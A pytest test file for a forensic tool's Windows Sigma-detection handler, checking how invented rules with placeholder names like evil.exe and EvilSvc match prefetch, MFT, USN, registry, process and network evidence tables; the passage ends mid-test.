"""SigmaHQ Windows rules over the engine's own tables (alert_win_sigma).

Tables and rules are invented; the rule sets are tiny and written here, so nothing
depends on the bundled or the installed rules. Names: HOST-01, jdoe, 10.0.0.5.
"""
from __future__ import annotations

import csv
import json
import logging
import uuid
from pathlib import Path

import pytest

from artifact_engine.config import load_config
from artifact_engine.core import asset_state, sigma_windows
from artifact_engine.core.runner import HandlerSkip, ParserContext
from artifact_engine.core.sigma_wincat import load_category, unwrap
from artifact_engine.core.sigma_windows import load_process_rules
from artifact_engine.handlers import win_sigma as W
from artifact_engine.registry import load_parsers

_HEADER = ["level", "rule", "source", "mitre", "first_seen", "last_seen", "count", "match",
           "rule_id"]
_REG = ["HiveType", "HivePath", "KeyPath", "ValueName", "ValueType", "ValueData",
        "LastWriteTimestamp"]
_SHA = "a1" * 20


def _id(title: str) -> str:
    return str(uuid.uuid5(uuid.NAMESPACE_DNS, title.lower().replace(" ", "-")))


def _rule(title, category, selection, level="high", rid=None, extra=""):
    body = "\n".join(f"        {k}: '{v}'" for k, v in selection.items())
    return (f"title: {title}\nid: {rid or _id(title)}\nstatus: test\n"
            f"level: {level}\ntags:\n    - attack.t1059\nlogsource:\n    product: windows\n"
            f"    category: {category}\ndetection:\n    selection:\n{body}\n{extra}"
            f"    condition: selection\n")


_CUSTOM = {
    "process_creation": [
        _rule("Evil Image", "process_creation", {"Image|endswith": "\\evil.exe"}),
        _rule("Evil Hash", "process_creation", {"Hashes|contains": f"SHA1={_SHA}"},
              level="critical"),
        _rule("Evil Parent", "process_creation", {"ParentImage|endswith": "\\parent.exe"},
              level="medium"),
        _rule("Context Only", "process_creation", {"Image|endswith": "\\evil.exe"},
              level="informational"),
    ],
    "file_event": [_rule("Evil File", "file_event", {"TargetFilename|endswith": "\\evil.txt"})],
    "file_delete": [_rule("Gone File", "file_delete", {"TargetFilename|endswith": "\\gone.txt"})],
    "registry_set": [
        _rule("Evil Service", "registry_set",
              {"TargetObject|endswith": "\\CurrentControlSet\\Services\\EvilSvc\\ImagePath",
               "Details|endswith": "\\evil.exe"}),
        _rule("Evil Run", "registry_set",
              {"TargetObject|endswith": "\\CurrentVersion\\Run\\Updater",
               "Details|contains": "evil"}),
        _rule("Any Write To Key", "registry_set",
              {"TargetObject|endswith": "\\Services\\WinSock2\\Parameters\\AutodialDLL"}),
        _rule("Debug Enabled", "registry_set",
              {"TargetObject|endswith": "\\EvilSvc\\Debug", "Details": "DWORD (0x00000001)"})],
    "network_connection": [
        _rule("Evil Out", "network_connection",
              {"Initiated": "true", "DestinationIp": "10.0.0.5"}),
        _rule("Evil In", "network_connection",
              {"Initiated": "false", "DestinationIp": "10.0.0.5"})],
}


@pytest.fixture(autouse=True)
def _rules(tmp_path, monkeypatch):
    """No bundled process_creation rules: the test's own are the only ones."""
    empty = tmp_path / "no_bundled_rules"
    empty.mkdir()
    monkeypatch.setattr(sigma_windows, "SIGMA_PROC_DIR", empty)
    load_process_rules.cache_clear()
    load_category.cache_clear()
    add = W._Group.add

    def checked(self, source, time, fields, agg):
        # a field a source yields outside its group's `base` would be dropped in
        # silence -- and `base` is what decides which rules can match (v0.7.192)
        assert set(fields) <= set(self.base), (source, set(fields) - set(self.base))
        return add(self, source, time, fields, agg)

    monkeypatch.setattr(W._Group, "add", checked)
    yield
    load_process_rules.cache_clear()
    load_category.cache_clear()


def _write(path: Path, header, rows):
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w", encoding="utf-8", newline="") as fh:
        w = csv.writer(fh)
        w.writerow(header)
        w.writerows(rows)


def _read(path: Path) -> list[dict]:
    if not path.is_file():
        return []
    with open(path, encoding="utf-8", newline="") as fh:
        return list(csv.DictReader(fh))


def _assets(tmp_path: Path, custom=_CUSTOM) -> Path:
    a = tmp_path / "assets"
    for cat, texts in custom.items():
        for i, text in enumerate(texts):
            f = a / "sigma_custom" / "windows" / cat / f"r{i}.yml"
            f.parent.mkdir(parents=True, exist_ok=True)
            f.write_text(text, encoding="utf-8")
    a.mkdir(exist_ok=True)
    return a


def _ctx(tmp_path: Path, tools=None, assets=None) -> ParserContext:
    ev = tmp_path / "C"
    ev.mkdir(parents=True, exist_ok=True)
    return ParserContext(
        evidence=ev, out=ev / "CSVs" / "Detections" / ".work_win_sigma",
        tools=tools or tmp_path / "no_tools", assets=assets or _assets(tmp_path),
        machine_name="HOST-01", volume="C", log=logging.getLogger("aeng.test"))


def _run(tmp_path: Path, **kw) -> list[dict]:
    ctx = _ctx(tmp_path, **kw)
    W.run(ctx)
    return _read(ctx.out / "alert_win_sigma.csv")


def _csvs(tmp_path: Path) -> Path:
    return tmp_path / "C" / "CSVs"


def _by(rows, rule):
    return [r for r in rows if r["rule"] == rule]


def _prefetch(tmp_path, rows):
    _write(_csvs(tmp_path) / "Execution" / "art_prefetch.csv",
           ["ExecutableName", "RunCount", "LastRun", "FilesLoaded"], rows)


_LOADED = (r"\VOLUME{01d-0a1b}\WINDOWS\SYSTEM32\NTDLL.DLL, "
           r"\VOLUME{01d-0a1b}\USERS\JDOE\TOOLS\EVIL.EXE")


def test_prefetch_image_is_the_loaded_path_with_the_drive(tmp_path):
    _prefetch(tmp_path, [["EVIL.EXE", "1", "2026-01-09 08:00:00.123", _LOADED]])
    (r,) = _by(_run(tmp_path), "Evil Image")
    assert r["source"] == "prefetch" and r["level"] == "high" and r["count"] == "1"
    assert r["match"] == "Image=C:\\USERS\\JDOE\\TOOLS\\EVIL.EXE"
    assert r["first_seen"] == r["last_seen"] == "2026-01-09 08:00:00"
    assert r["rule_id"] == _id("Evil Image") and r["mitre"] == "t1059"


def test_a_windows_7_prefetch_path_gets_its_drive_too(tmp_path):
    # Windows 7 writes FilesLoaded as \DEVICE\HARDDISKVOLUMEn\...: without the drive a
    # System32 program fails every `startswith C:\Windows\System32` filter.
    _prefetch(tmp_path, [["EVIL.EXE", "1", "2026-01-09 08:00:00",
                          r"\DEVICE\HARDDISKVOLUME2\USERS\JDOE\TOOLS\EVIL.EXE"]])
    (r,) = _by(_run(tmp_path), "Evil Image")
    assert r["match"] == "Image=C:\\USERS\\JDOE\\TOOLS\\EVIL.EXE"


def test_a_prefetch_without_its_own_path_is_not_evaluated(tmp_path):
    # A bare name would satisfy `endswith` and fail every `startswith C:\Windows`
    # filter: a false "binary outside its folder" on every such entry.
    _prefetch(tmp_path, [["EVIL.EXE", "1", "2026-01-09 08:00:00", r"\VOLUME{1}\X\Y.DLL"]])
    assert _by(_run(tmp_path), "Evil Image") == []


def test_amcache_and_shimcache_rows_match_with_their_own_source(tmp_path):
    c = _csvs(tmp_path) / "Execution"
    _write(c / "art_amcache_unassociated_files.csv",
           ["Name", "FullPath", "SHA1", "FileKeyLastWriteTimestamp"],
           [["evil.exe", r"C:\Users\jdoe\evil.exe", "0000" + _SHA, "2026-01-05 10:00:00"]])
    _write(c / "art_amcache_associated_files.csv",
           ["Name", "FullPath", "SHA1", "FileKeyLastWriteTimestamp"],
           [["ok.exe", r"C:\Users\jdoe\ok.exe", "", "2026-01-05 10:00:00"]])
    _write(c / "art_reg_shimcache.csv", ["Path", "LastModifiedTimeUTC", "Executed"],
           [[r"C:\Users\jdoe\evil.exe", "2026-01-06 11:00:00", ""]])
    rows = _run(tmp_path)
    assert {r["source"] for r in _by(rows, "Evil Image")} == {"amcache", "shimcache"}
    (h,) = _by(rows, "Evil Hash")                # the padding is taken off the SHA1
    assert h["source"] == "amcache" and h["level"] == "critical"
    assert h["match"] == "Image=C:\\Users\\jdoe\\evil.exe"
    shim = next(r for r in _by(rows, "Evil Image") if r["source"] == "shimcache")
    assert shim["first_seen"] == "2026-01-06 11:00:00"


def test_live_response_processes_carry_their_parent(tmp_path):
    res = tmp_path / "C" / "Velociraptor" / "LiveResponse" / "results"
    res.mkdir(parents=True)
    lines = [{"Pid": 10, "Ppid": 1, "Name": "parent.exe", "Exe": r"C:\Tools\parent.exe",
              "CommandLine": "parent.exe", "Username": "HOST-01\\jdoe",
              "CreateTime": "2026-01-10T07:00:00Z"},
             {"Pid": 11, "Ppid": 10, "Name": "evil.exe", "Exe": r"C:\Tools\evil.exe",
              "CommandLine": "evil.exe -x", "Username": "HOST-01\\jdoe",
              "CreateTime": "2026-01-10T07:01:00Z"}]
    (res / "Eiffel.LiveResponse.Windows%2FWindows.System.Pslist.json").write_text(
        "\n".join(json.dumps(x) for x in lines), encoding="utf-8")
    rows = _run(tmp_path)
    (e,) = _by(rows, "Evil Image")
    assert e["source"] == "liveresponse" and e["first_seen"] == "2026-01-10 07:01:00"
    assert e["match"] == "Image=C:\\Tools\\evil.exe CommandLine=evil.exe -x"
    (p,) = _by(rows, "Evil Parent")                # only the child names it as its parent
    assert p["match"].startswith("Image=C:\\Tools\\evil.exe")


def test_mft_path_gets_the_drive_and_directories_and_deleted_rows_are_ignored(tmp_path):
    hdr = ["ParentPath", "FileName", "InUse", "IsDirectory", "Created0x10"]
    parent = ".\\Users\\jdoe"
    _write(_csvs(tmp_path) / "Filesystem" / "art_mft.csv", hdr, [
        [parent, "evil.txt", "True", "False", "2026-01-02 03:04:05.1234567"],
        [parent, "evil.txt", "True", "True", "2026-01-03 03:04:05"],       # a directory
        [parent, "evil.txt", "False", "False", "2026-01-04 03:04:05"],     # not in use
        [".", "other.txt", "True", "False", "2026-01-05 03:04:05"]])
    (r,) = _by(_run(tmp_path), "Evil File")
    assert r["source"] == "mft" and r["count"] == "1"
    assert r["match"] == "TargetFilename=C:\\Users\\jdoe\\evil.txt"
    assert r["first_seen"] == "2026-01-02 03:04:05"


def test_the_collectors_copy_and_winsxs_are_not_evidence(tmp_path):
    # exec_hunt's rule too: a file under the collector's own copy of the volume is a
    # second record of one that lives elsewhere; WinSxS holds OS payload.
    _write(_csvs(tmp_path) / "Collection" / "art_collection.csv", ["path", "exclude"],
           [[".\\Users\\jdoe\\Desktop\\kape\\result", "yes"]])
    hdr = ["ParentPath", "FileName", "InUse", "IsDirectory", "Created0x10"]
    _write(_csvs(tmp_path) / "Filesystem" / "art_mft.csv", hdr, [
        [".\\Users\\jdoe\\Desktop\\kape\\result\\C\\Users\\jdoe", "evil.txt", "True", "False",
         "2026-01-02 03:04:05"],
        [".\\Windows\\WinSxS\\amd64_x_1.0", "evil.txt", "True", "False", "2026-01-02 03:04:05"],
        [".\\Users\\jdoe", "evil.txt", "True", "False", "2026-01-02 03:04:05"]])
    _write(_csvs(tmp_path) / "Filesystem" / "art_usn.csv",
           ["Name", "ParentPath", "UpdateTimestamp", "UpdateReasons"],
           [["evil.txt", ".\\Windows\\WinSxS\\Temp", "2026-01-03 00:00:00", "FileCreate"]])
    (r,) = _by(_run(tmp_path), "Evil File")
    assert r["source"] == "mft" and r["count"] == "1"
    assert r["match"] == "TargetFilename=C:\\Users\\jdoe\\evil.txt"


def test_shimcache_sysvol_is_the_system_drive(tmp_path):
    # "SYSVOL\Windows\..." without its drive fails every "inside C:\Windows" filter.
    _write(_csvs(tmp_path) / "Execution" / "art_reg_shimcache.csv", ["Path", "LastModifiedTimeUTC"],
           [["SYSVOL\\Users\\jdoe\\evil.exe", "2026-01-01 00:00:00"],
            ["\\??\\C:\\Users\\jdoe\\Downloads\\evil.exe", "2026-01-01 00:00:00"]])
    (r,) = _by(_run(tmp_path), "Evil Image")
    assert r["count"] == "2" and r["match"] == "Image=C:\\Users\\jdoe\\evil.exe"


def test_usn_gets_its_folder_from_the_mft(tmp_path):
    # MFTECmd fills $J's ParentPath only when given the MFT: the folder is then the
    # MFT directory whose entry number the record names.
    _write(_csvs(tmp_path) / "Filesystem" / "art_mft.csv",
           ["EntryNumber", "ParentPath", "FileName", "IsDirectory", "InUse", "Created0x10"], [
               ["5", ".", ".", "True", "True", ""],
               ["700", ".", "Users", "True", "True", ""],
               ["701", ".\\Users", "jdoe", "True", "True", ""],
               ["702", ".\\Windows", "servicing", "True", "True", ""]])
    _write(_csvs(tmp_path) / "Filesystem" / "art_usn.csv",
           ["Name", "ParentEntryNumber", "ParentPath", "UpdateTimestamp", "UpdateReasons"], [
               ["evil.txt", "701", "", "2026-01-03 00:00:00", "FileCreate"],
               ["evil.txt", "999", "", "2026-01-03 00:00:01", "FileCreate"],      # unknown folder
               ["evil.txt", "702", "", "2026-01-03 00:00:02", "FileCreate"]])     # OS payload
    (r,) = _by(_run(tmp_path), "Evil File")
    assert r["source"] == "usn" and r["count"] == "1"
    assert r["match"] == "TargetFilename=C:\\Users\\jdoe\\evil.txt"


def test_windows_servicing_is_not_evidence_and_sysnative_is_system32(tmp_path):
    hdr = ["ParentPath", "FileName", "InUse", "IsDirectory", "Created0x10"]
    _write(_csvs(tmp_path) / "Filesystem" / "art_mft.csv", hdr, [
        [".\\Windows\\servicing\\LCU\\Package_1\\amd64_x", "evil.txt", "True", "False",
         "2026-01-02 03:04:05"]])
    _write(_csvs(tmp_path) / "Execution" / "art_reg_shimcache.csv", ["Path", "LastModifiedTimeUTC"],
           [["C:\\Windows\\Sysnative\\evil.exe", "2026-01-01 00:00:00"]])
    rows = _run(tmp_path)
    assert _by(rows, "Evil File") == []
    (r,) = _by(rows, "Evil Image")
    assert r["match"] == "Image=C:\\Windows\\System32\\evil.exe"


def test_usn_create_is_file_event_and_delete_is_file_delete(tmp_path):
    parent = ".\\Users\\jdoe"
    _write(_csvs(tmp_path) / "Filesystem" / "art_usn.csv",
           ["Name", "ParentPath", "UpdateTimestamp", "UpdateReasons"], [
               ["evil.txt", parent, "2026-01-03 00:00:00", "FileCreate|Close"],
               ["evil.txt", parent, "2026-01-03 00:01:00", "DataExtend"],
               ["gone.txt", parent, "2026-01-03 00:02:00", "FileDelete|Close"],
               ["gone.txt", parent, "2026-01-03 00:03:00", "FileCreate"],
               ["gone.txt", "", "2026-01-03 00:04:00", "FileDelete|Close"]])
    rows = _run(tmp_path)
    (c,) = _by(rows, "Evil File")
    assert c["source"] == "usn" and c["count"] == "1"
    assert c["match"] == "TargetFilename=C:\\Users\\jdoe\\evil.txt"
    # the create of gone.txt is not a deletion, and a record without its folder is
    # not read (a bare name would trip every "outside the usual folder" rule)
    (d,) = _by(rows, "Gone File")
    assert d["source"] == "usn" and d["count"] == "1"
    assert d["first_seen"] == d["last_seen"] == "2026-01-03 00:02:00"


def test_registry_target_object_is_normalised(tmp_path):
    c = _csvs(tmp_path) / "Registry"
    _write(c / "art_reg_services.csv", _REG, [
        ["SYSTEM", r"C:\x\Windows\System32\config\SYSTEM",
         r"ROOT\ControlSet001\Services\EvilSvc", "ImagePath", "RegExpandSz", r"C:\evil.exe",
         "2026-01-04 10:00:00"]])
    _write(c / "art_reg_users.csv", _REG, [
        ["NTUSER", r"C:\x\Users\jdoe\NTUSER.DAT",
         r"ROOT\Software\Microsoft\Windows\CurrentVersion\Run", "Updater", "RegSz",
         r"C:\evil.exe", "2026-01-05 10:00:00"]])
    rows = _run(tmp_path)
    (s,) = _by(rows, "Evil Service")
    assert s["source"] == "registry"
    assert s["match"] == ("TargetObject=HKLM\\SYSTEM\\CurrentControlSet\\Services\\EvilSvc"
                          "\\ImagePath Details=C:\\evil.exe")
    (u,) = _by(rows, "Evil Run")
    assert u["match"].startswith(
        "TargetObject=HKU\\USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater")
    assert u["first_seen"] == "2026-01-05 10:00:00"


def test_a_rule_known_to_fire_on_every_hive_is_not_run_over_registry_state(tmp_path):
    from artifact_engine.handlers import win_sigma as W2
    assert "0cb8d736-995d-4ce7-a31e-1e8d452a1459" in W2._STATE_NOISE
    rule = _rule("EventLog File", "registry_set",
                 {"TargetObject|endswith": "\\ObjectNames\\File"},
                 rid="0cb8d736-995d-4ce7-a31e-1e8d452a1459",
                 extra="    filter:\n        Details|contains: '\\Winevt\\Logs\\'\n")
    rule = rule.replace("condition: selection", "condition: selection and not filter")
    (tmp_path / "assets" / "sigma_custom" / "windows" / "registry_set").mkdir(parents=True,
                                                                             exist_ok=True)
    (tmp_path / "assets" / "sigma_custom" / "windows" / "registry_set" / "z.yml").write_text(
        rule, encoding="utf-8")
    _write(_csvs(tmp_path) / "Registry" / "art_reg_services.csv", _REG, [
        ["SYSTEM", r"C:\x\SYSTEM", r"ROOT\ControlSet001\Services\EventLog\Security\Security\ObjectNames",
         "File", "RegDword", "4416", "2026-01-04 10:00:00"]])
    assert _by(_run(tmp_path), "EventLog File") == []


def test_registry_state_only_fires_rules_that_need_the_value(tmp_path):
    # A rule for "any write to this key" says nothing about a hive's state: the key
    # is there, with its default, on every host.
    _write(_csvs(tmp_path) / "Registry" / "art_reg_services.csv", _REG, [
        ["SYSTEM", r"C:\x\SYSTEM", r"ROOT\ControlSet001\Services\WinSock2\Parameters",
         "AutodialDLL", "RegSz", r"C:\Windows\System32\rasadhlp.dll", "2026-01-04 10:00:00"],
        ["SYSTEM", r"C:\x\SYSTEM",
         r"CsiTool-CreateHive-{00000000-0000-0000-0000-000000000000}\ControlSet001\Services\EvilSvc",
         "Debug", "RegDword", "1", "2026-01-04 10:00:00"]])
    rows = _run(tmp_path)
    assert _by(rows, "Any Write To Key") == []
    (d,) = _by(rows, "Debug Enabled")       # offline root dropped, DWORD as Sysmon writes it
    assert d["match"] == ("TargetObject=HKLM\\SYSTEM\\CurrentControlSet\\Services\\EvilSvc"
                          "\\Debug Details=DWORD (0x00000001)")


def test_a_registry_table_without_key_and_value_columns_is_not_read(tmp_path):
    _write(_csvs(tmp_path) / "Registry" / "art_reg_user_activity.csv",
           ["user", "key", "data"], [["jdoe", "x", "y"]])
    # the table exists, so the run does not skip: it simply finds nothing
    ctx = _ctx(tmp_path)
    W.run(ctx)
    assert not (ctx.out / "alert_win_sigma.csv").exists()


def test_network_initiated_follows_listening_ports(tmp_path):
    hdr = ["pid", "process", "path", "user", "state", "proto", "local_ip", "local_port",
           "remote_ip", "remote_port", "socket_created_utc", "start_utc"]
    _write(_csvs(tmp_path) / "Network" / "art_process_network.csv", hdr, [
        ["100", "evil.exe", r"C:\Tools\evil.exe", "jdoe", "ESTABLISHED", "tcp", "10.0.0.9",
         "50000", "10.0.0.5", "443", "2026-01-07 01:00:00", ""],
        ["200", "svc.exe", r"C:\Tools\svc.exe", "jdoe", "LISTEN", "tcp", "0.0.0.0", "8080",
         "", "", "", ""],
        ["200", "svc.exe", r"C:\Tools\svc.exe", "jdoe", "ESTABLISHED", "tcp", "10.0.0.9",
         "8080", "10.0.0.5", "51000", "", "2026-01-07 02:00:00"]])
    rows = _run(tmp_path)
    (o,) = _by(rows, "Evil Out")
    assert o["source"] == "netstat" and o["count"] == "1"
    assert o["match"] == "Image=C:\\Tools\\evil.exe DestinationIp=10.0.0.5 DestinationPort=443"
    (i,) = _by(rows, "Evil In")
    assert i["match"].startswith("Image=C:\\Tools\\svc.exe")
    assert i["first_seen"] == "2026-01-07 02:00:00"


def _hayabusa(tmp_path: Path) -> Path:
    """A tools dir whose hayabusa rules carry the Channel selection, as the shipped copy does."""
    tools = tmp_path / "tools"
    hay = tools / "hayabusa"
    hay.mkdir(parents=True)
    (hay / "hayabusa-9.9.9-win-x64.exe").write_bytes(b"")
    d = hay / "rules" / "sigma" / "sysmon" / "file" / "file_event"
    d.mkdir(parents=True)
    head = ("title: {t}\nid: {i}\nstatus: test\nlevel: high\ntags:\n    - attack.t1059\n"
            "    - sysmon\nlogsource:\n    product: windows\n    category: file_event\n"
            "detection:\n    file_event:\n        EventID: 11\n"
            "        Channel: Microsoft-Windows-Sysmon/Operational\n"
            "    selection:\n        TargetFilename|endswith: '\\hay.txt'\n"
            "    other:\n        TargetFilename|endswith: '\\other.txt'\n"
            "    condition: {c}\n")
    (d / "wrapped.yml").write_text(
        head.format(t="Hay Wrapped", i=_id("Hay Wrapped"), c="file_event and (selection)"),
        encoding="utf-8")
    (d / "wrapped_plain.yml").write_text(
        head.format(t="Hay Plain", i=_id("Hay Plain"), c="file_event and selection"),
        encoding="utf-8")
    (d / "loose.yml").write_text(
        head.format(t="Hay Loose", i=_id("Hay Loose"), c="file_event and selection or other"),
        encoding="utf-8")
    return tools


def _files(tmp_path: Path):
    parent = ".\\Users\\jdoe"
    _write(_csvs(tmp_path) / "Filesystem" / "art_mft.csv",
           ["ParentPath", "FileName", "InUse", "IsDirectory", "Created0x10"],
           [[parent, "hay.txt", "True", "False", "2026-01-02 00:00:00"],
            [parent, "other.txt", "True", "False", "2026-01-02 00:00:00"]])


def test_hayabusas_channel_selection_is_taken_off(tmp_path):
    _files(tmp_path)
    rows = _run(tmp_path, tools=_hayabusa(tmp_path))
    assert {r["rule"] for r in rows} == {"Hay Wrapped", "Hay Plain"}
    assert {r["match"] for r in rows} == {"TargetFilename=C:\\Users\\jdoe\\hay.txt"}
    # the bare `sysmon` tag pySigma refuses is dropped, the ATT&CK one kept
    assert {r["mitre"] for r in rows} == {"t1059"}


def test_a_condition_that_cannot_be_unwrapped_is_skipped_and_counted(tmp_path):
    tools = _hayabusa(tmp_path)
    haya = tools / "hayabusa" / "rules" / "sigma" / "sysmon"
    loaded = load_category("file_event", None, haya)
    assert sorted(r.title for r in loaded.rules) == ["Hay Plain", "Hay Wrapped"]
    assert loaded.unwrap_skipped == 1
    wrapper = {"EventID": 11, "Channel": "x"}
    base = {"detection": {"w": wrapper, "a": {"F": "1"}, "b": {"F": "2"}}}

    def cond(text):
        return unwrap({"detection": {**base["detection"], "condition": text}})

    assert cond("w and (a or b)")["detection"]["condition"] == "(a or b)"
    assert cond("w and a and not b")["detection"]["condition"] == "a and not b"
    assert cond("w and a or b") is None                 # b would lose the channel test
    assert cond("w and (a) or (b)") is None
    assert cond("w and a and w") is None                # named again
    assert cond("a and w") is None                      # not wrapped that way
    assert cond("w and 1 of w*") is None                # a pattern that would count it
    assert unwrap({"detection": {"a": {"F": "1"}, "condition": "a"}}) is None


def test_an_informational_rule_produces_nothing(tmp_path):
    _prefetch(tmp_path, [["EVIL.EXE", "1", "2026-01-09 08:00:00", _LOADED]])
    rows = _run(tmp_path)
    assert _by(rows, "Context Only") == []
    assert _by(rows, "Evil Image")


def test_two_matching_rows_are_one_row_with_count_and_span(tmp_path):
    _prefetch(tmp_path, [
        ["EVIL.EXE", "1", "2026-01-09 08:00:00", _LOADED],
        ["EVIL.EXE", "1", "2026-01-07 06:00:00", _LOADED],
        ["EVIL.EXE", "1", "2026-01-08 06:00:00", _LOADED]])
    (r,) = _by(_run(tmp_path), "Evil Image")
    assert r["count"] == "3"
    assert r["first_seen"] == "2026-01-07 06:00:00" and r["last_seen"] == "2026-01-09 08:00:00"
    assert r["match"] == "Image=C:\\USERS\\JDOE\\TOOLS\\EVIL.EXE"       # the first row's


def test_header_is_the_linux_sigma_header_and_no_input_skips(tmp_path):
    _prefetch(tmp_path, [["EVIL.EXE", "1", "2026-01-09 08:00:00", _LOADED]])
    ctx = _ctx(tmp_path)
    W.run(ctx)
    with open(ctx.out / "alert_win_sigma.csv", encoding="utf-8", newline="") as fh:
        assert next(csv.reader(fh)) == _HEADER == W._HEADER
    from artifact_engine.handlers import lin_sigma
    src = Path(lin_sigma.__file__).read_text(encoding="utf-8")
    assert '["level", "rule", "source", "mitre", "first_seen", "last_seen", "count",' in src
    with pytest.raises(HandlerSkip):
        W.run(_ctx(tmp_path / "other", assets=_assets(tmp_path / "other")))


def test_batching_gives_the_same_result(tmp_path, monkeypatch):
    _prefetch(tmp_path, [
        ["EVIL.EXE", "1", "2026-01-09 08:00:00", _LOADED],
        ["EVIL.EXE", "1", "2026-01-07 06:00:00", ""]])
    _files(tmp_path)
    _write(_csvs(tmp_path) / "Filesystem" / "art_usn.csv",
           ["Name", "ParentPath", "UpdateTimestamp", "UpdateReasons"],
           [["gone.txt", ".\\Temp", "2026-01-03 00:02:00", "FileDelete"],
            ["gone.txt", ".\\Temp", "2026-01-03 00:09:00", "FileDelete"]])
    tools = _hayabusa(tmp_path)
    scans = []
    real = W._Group._scan
    monkeypatch.setattr(W._Group, "_scan", lambda self, rows, *a: (scans.append(len(rows)),
                                                                   real(self, rows, *a))[1])
    whole = _run(tmp_path, tools=tools)
    assert len(whole) == 4
    once = len(scans)
    monkeypatch.setattr(W, "_BATCH", 1)
    assert _run(tmp_path, tools=tools) == whole
    assert len(scans) - once > once and max(scans[once:]) == 1       # one row at a time


def test_parsers_follow_custom_folder(tmp_path):
    cfg = load_config()
    (tmp_path / "sigma_custom").mkdir()
    parsers = {p.id: p for p in load_parsers(cfg.all_parser_dirs)}
    assert "sigma_custom" in asset_state.used(parsers["alert_win_sigma"], tmp_path)
    m = parsers["alert_win_sigma"]
    assert m.kind == "alert" and m.os == "windows" and m.category == "detections"
    assert set(m.depends_on) <= set(parsers)


def test_a_rule_that_needs_a_field_the_disk_lacks_is_dropped_and_widens_no_gate(tmp_path):
    custom = tmp_path / "custom"
    d = custom / "windows" / "file_event"
    d.mkdir(parents=True)
    (d / "a.yml").write_text(_rule("Evil File", "file_event",
                                   {"TargetFilename|endswith": "\\evil.txt"}), encoding="utf-8")
    (d / "b.yml").write_text(_rule("Word Writes Temp", "file_event",
                                   {"Image|endswith": "\\winword.exe",
                                    "TargetFilename|contains": "\\Temp\\"}), encoding="utf-8")
    g = W._Group("file_event", load_category("file_event", custom).rules)
    assert [r.title for r in g.rules] == ["Evil File"] and g.impossible == 1
    row = ["C:\\Users\\jdoe\\AppData\\Local\\Temp\\report.docx", *g.pad, "", "mft"]
    assert not g.gate(row)


def _broad_and_narrow(tmp_path):
    custom = tmp_path / "custom"
    d = custom / "windows" / "file_event"
    d.mkdir(parents=True)
    (d / "a.yml").write_text(_rule("Temp Write", "file_event",
                                   {"TargetFilename|contains": "\\Temp\\"}), encoding="utf-8")
    (d / "b.yml").write_text(_rule("Evil File", "file_event",
                                   {"TargetFilename|endswith": "\\evil.txt"}), encoding="utf-8")
    rules = load_category("file_event", custom).rules
    # 200 rows under Temp (two of them evil.txt, past the first sample), 30
    # elsewhere (every tenth an evil.txt)
    names = [f"C:\\Windows\\Temp\\{'evil' if i % 97 == 50 else f'f{i}'}.txt"
             for i in range(200)]
    names += [f"C:\\Users\\jdoe\\{'evil' if i % 10 == 0 else f'g{i}'}.txt" for i in range(30)]
    return rules, [(n, f"2026-01-{1 + i % 28:02d} 00:00:00") for i, n in enumerate(names)]


def _feed(rules, rows):
    g = W._Group("file_event", rules)
    agg: dict = {}
    for name, when in rows:
        g.add("mft", when, {"TargetFilename": name}, agg)
    g.flush(agg)
    return {k: (a["count"], a["first"], a["last"]) for k, a in agg.items()}


def test_a_narrow_rule_does_not_read_what_only_a_broad_one_lets_in(tmp_path, monkeypatch):
    # AE-044: one gate for every rule let in what the broadest needs, and every
    # rule read all of it.
    rules, rows = _broad_and_narrow(tmp_path)
    monkeypatch.setattr(W, "_SAMPLE", 20)
    read = {}
    real = W._Group._scan
    monkeypatch.setattr(W._Group, "_scan", lambda self, rows, rs, agg: (
        [read.__setitem__(r.title, read.get(r.title, 0) + len(rows)) for r in rs],
        real(self, rows, rs, agg))[1])
    _feed(rules, rows)
    assert read == {"Temp Write": 200, "Evil File": 5}


def test_splitting_the_gate_finds_what_one_gate_finds(tmp_path, monkeypatch):
    rules, rows = _broad_and_narrow(tmp_path)
    monkeypatch.setattr(W, "_SAMPLE", 20)
    split = _feed(rules, rows)
    monkeypatch.setattr(W, "_BROAD", 2.0)           # no rule broad: one bucket
    one = _feed(rules, rows)
    assert split == one
    assert sorted(c for c, _f, _l in one.values()) == [5, 200]
    monkeypatch.setattr(W, "_BROAD", 0.01)
    monkeypatch.setattr(W, "_SAMPLE", 5)
    monkeypatch.setattr(W, "_BATCH", 7)               # split on the first batch, then more
    assert _feed(rules, rows) == one


# ---- every value of every hive (v0.7.195) ----------------------------------------

class _V:
    def __init__(self, name, vtype, value):
        self._n, self._t, self._v = name, vtype, value

    def name(self):
        return self._n

    def value_type(self):
        return self._t

    def value(self):
        return self._v


class _K:
    """Just enough of python-registry's key: name, timestamp, values, subkeys."""

    def __init__(self, name, values=(), subkeys=(), when="2026-01-06T10:00:00"):
        self._n, self._vals, self._subs, self._when = name, list(values), list(subkeys), when

    def name(self):
        return self._n

    def timestamp(self):
        from datetime import datetime
        return datetime.fromisoformat(self._when)

    def values(self):
        return self._vals

    def subkeys(self):
        return self._subs


class _H:
    def __init__(self, root):
        self._root = root

    def root(self):
        return self._root


def _path(*parts, leaf):
    """A chain of keys, one inside the next, the last holding `leaf`."""
    key = leaf
    for p in reversed(parts):
        key = _K(p, subkeys=[key])
    return key


def _hives(tmp_path, monkeypatch, hives: dict):
    """Hive files at their places under the volume, read as the fakes given."""
    ev = tmp_path / "C"
    for rel in hives:
        (ev / rel).parent.mkdir(parents=True, exist_ok=True)
        (ev / rel).write_bytes(b"regf")
    by = {str((ev / rel).resolve()).lower(): h for rel, h in hives.items()}
    monkeypatch.setattr(W, "_open", lambda p: by.get(str(Path(p).resolve()).lower()))


def _system(debug=1):
    svc = _K("EvilSvc", values=[_V("ImagePath", 2, "C:\\evil.exe"), _V("Debug", 4, debug)])
    return _H(_K("CsiTool-CreateHive-{00000000-0000-0000-0000-000000000000}", subkeys=[
        _path("ControlSet001", "Services", leaf=svc)]))


def _ntuser():
    run = _K("Run", values=[_V("Updater", 1, "C:\\Users\\jdoe\\evil.exe\x00")],
             when="2026-01-07T09:30:00")
    return _H(_K("ROOT", subkeys=[_path("Software", "Microsoft", "Windows", "CurrentVersion",
                                        leaf=run)]))


def test_every_hive_value_is_read_without_a_registry_table(tmp_path, monkeypatch):
    # The RECmd tables hold a few batch files' keys, never a Run key: a registry
    # rule read over them alone was blind. The hives are read whole.
    _hives(tmp_path, monkeypatch, {"Windows/System32/config/SYSTEM": _system(),
                                   "Users/jdoe/NTUSER.DAT": _ntuser()})
    rows = _run(tmp_path)
